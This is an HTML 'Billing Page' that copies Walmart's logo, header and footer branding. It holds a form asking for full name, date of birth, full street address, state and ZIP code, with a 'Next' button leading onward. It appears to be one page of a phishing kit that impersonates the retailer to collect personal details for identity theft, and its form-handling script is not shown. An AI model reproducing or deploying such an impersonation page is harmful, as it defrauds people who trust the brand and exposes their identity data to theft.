<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Billing Page</title>
  <link rel="stylesheet" href="styles3.css">
  <script src="script.js"></script>
</head>
<body>
  <header class="walmarthd">
    <div class="header-content">
      <a link-identifier="logoLink" aria-atomic="true" aria-label="Walmart. Save Money. Live Better. Home Page" href="/">
        <img loading="lazy" src="imgs/k2-_ef2c8660-96ed-4f64-891d-329fa488c482.v1.png" alt="Walmart logo with link to homepage." height="65" width="64">
      </a>
      <div class="header-text">
        <h1 class="mt2 mb4 f3">Walmart</h1>
        <p class="w_U9_0 w_U0S3 w_QcqU ma0 mb4"></p>
      </div>
    </div>
  </header>

  <div class="billing-container">
    <h2>#</h2>
    <div class="text-placeholder">
      <!-- Placeholder for additional text content -->
    </div>
    <div class="form-group">
      <label for="first-name">Full Name</label>
      <input type="text" id="first-name" name="first-name" required>
    </div>
    <div class="form-group">
      <label for="dob">Date of Birth:</label>
      <input type="text" id="dob" name="dob" oninput="formatDate(this)" required>
    </div>
    <h3>#</h3>
    <div class="form-group">
      <label for="street-address">Address</label>
      <input type="text" id="street-address" name="street-address" required>
    </div>
    <div class="form-group flex-container">
      <div class="apt-unit">
        <label for="apt-unit">Apt or Unit</label>
        <input type="text" id="apt-unit" name="apt-unit" required>
      </div>
      <div class="city">
        <label for="city">City</label>
        <input type="text" id="city" name="city" required>
      </div>
    </div>
    <div class="form-group flex-container">
      <div class="state">
        <label for="state">State</label>
        <select id="state" name="state" required>
          <option value="" disabled selected>Select State</option>
          <option value="AL">Alabama</option>
          <option value="AK">Alaska</option>
          <option value="AZ">Arizona</option>
          <option value="AR">Arkansas</option>
          <option value="CA">California</option>
          <option value="CO">Colorado</option>
          <option value="CT">Connecticut</option>
          <option value="DE">Delaware</option>
          <option value="DC">District Of Columbia</option>
          <option value="FL">Florida</option>
          <option value="GA">Georgia</option>
          <option value="HI">Hawaii</option>
          <option value="ID">Idaho</option>
          <option value="IL">Illinois</option>
          <option value="IN">Indiana</option>
          <option value="IA">Iowa</option>
          <option value="KS">Kansas</option>
          <option value="KY">Kentucky</option>
          <option value="LA">Louisiana</option>
          <option value="ME">Maine</option>
          <option value="MD">Maryland</option>
          <option value="MA">Massachusetts</option>
          <option value="MI">Michigan</option>
          <option value="MN">Minnesota</option>
          <option value="MS">Mississippi</option>
          <option value="MO">Missouri</option>
          <option value="MT">Montana</option>
          <option value="NE">Nebraska</option>
          <option value="NV">Nevada</option>
          <option value="NH">New Hampshire</option>
          <option value="NJ">New Jersey</option>
          <option value="NM">New Mexico</option>
          <option value="NY">New York</option>
          <option value="NC">North Carolina</option>
          <option value="ND">North Dakota</option>
          <option value="OH">Ohio</option>
          <option value="OK">Oklahoma</option>
          <option value="OR">Oregon</option>
          <option value="PA">Pennsylvania</option>
          <option value="RI">Rhode Island</option>
          <option value="SC">South Carolina</option>
          <option value="SD">South Dakota</option>
          <option value="TN">Tennessee</option>
          <option value="TX">Texas</option>
          <option value="UT">Utah</option>
          <option value="VT">Vermont</option>
          <option value="VA">Virginia</option>
          <option value="WA">Washington</option>
          <option value="WV">West Virginia</option>
          <option value="WI">Wisconsin</option>
          <option value="WY">Wyoming</option>
        </select>
      </div>
      <div class="zipcode">
        <label for="zipcode">Zipcode</label>
        <input type="text" id="zipcode" name="zipcode" pattern="[0-9]{5,}" inputmode="numeric" required>
    </div>
    
    </div>
    <button class="submit-btn">Next</button>
    
  </div>

  <footer>
    <!-- Walmart footer content -->
    <footer class="year-footer">
      <ul class="list ma0 mt3 ph0 pt1">
        <!-- List items for footer links -->
        <li>
          <a link-identifier="Generic Name" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="CA Privacy Rights - opens in a new window" target="_blank" rel="noopener noreferrer" href="https://corporate.walmart.com/privacy-security/california-privacy-rights">
            <span>CA Privacy Rights</span>
            <span class="w_iUH7"></span>
          </a>
        </li>
        <!-- Add more list items for other footer links -->
      </ul>

    </footer>
  </footer>

</body>
</html>
